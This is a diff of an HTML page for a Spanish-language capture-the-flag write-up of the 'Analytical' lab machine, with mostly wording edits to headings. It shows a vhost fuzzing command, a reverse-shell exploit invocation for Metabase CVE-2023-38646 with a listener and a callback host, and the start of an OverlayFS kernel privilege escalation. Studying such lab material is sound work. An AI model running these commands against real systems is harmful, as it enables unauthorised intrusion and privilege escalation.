@@ -29,10 +29,10 @@
         <section class="writeup-section">
           <h2>Índice</h2>
           <ul>
-            <li><code>Enumeración</code>: Web</li>
-            <li><code>Explotación</code>: VHosts con CMS vulnerable Metabase que permite acceso con un PoC</li>
-            <li><code>Movimiento Lateral</code>: Accedemos a un contenedor y revisando variables de entorno encontramos credenciales para entrar por SSH</li>
-            <li><code>Escalada Privilegios</code>: Kernel</li>
+            <li><code>Enumeración</code>: Fuzzing de vhosts para descubrir <code>data.analytical.htb</code></li>
+            <li><code>Explotación</code>: Metabase vulnerable a RCE mediante PoC, obteniendo shell en un contenedor</li>
+            <li><code>Movimiento lateral</code>: Variables de entorno del contenedor exponen credenciales reutilizables por SSH</li>
+            <li><code>Escalada de Privilegios</code>: Kernel vulnerable a CVE-2023-2640 / CVE-2023-32629 mediante OverlayFS</li>
           </ul>
         </section>
 
@@ -40,7 +40,7 @@
           <h2>Enumeración</h2>
           <img class="writeup-image" src="/writeups/assets/analytical/pasted-20260402184252.png" alt="Enumeración de Analytics" />
           <div class="code-card">
-            <h3>Fuzzear SubDominios</h3>
+            <h3>Fuzzing de subdominios</h3>
             <pre><code>gobuster vhost -u http://10.129.229.224 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --domain analytical.htb --append-domain
 # data.analytical.htb</code></pre>
           </div>
@@ -50,9 +50,9 @@
 
         <section class="writeup-section">
           <h2>Explotación</h2>
-          <p><a href="https://github.com/securezeron/CVE-2023-38646">PoC Github</a></p>
+          <p><a href="https://github.com/securezeron/CVE-2023-38646">PoC de GitHub</a></p>
           <div class="code-card">
-            <h3>PoC Github</h3>
+            <h3>PoC de GitHub</h3>
             <pre><code># Listener
 penelope -p 443
 
@@ -78,14 +78,14 @@ python CVE-2023-38646-Reverse-Shell.py --rhost data.analytical.htb --lhost 10.10
         </section>
 
         <section class="writeup-section">
-          <h2>Escalada Privilegios</h2>
+          <h2>Escalada de Privilegios</h2>
           <div class="code-card">
             <h3>Enumerar Kernel</h3>
             <pre><code>uname -a</code></pre>
           </div>
           <img class="writeup-image" src="/writeups/assets/analytical/pasted-20260402185917.png" alt="Versión de kernel" />
           <img class="writeup-image" src="/writeups/assets/analytical/pasted-20260402185847.png" alt="Kernel vulnerable" />
-          <p><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh">PoC GitHub CVE-2023-32629</a></p>
+          <p><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh">PoC de GitHub CVE-2023-32629</a></p>
           <div class="code-card">
             <h3>Exploit</h3>
             <pre><code>cd /home/metalytics/temp
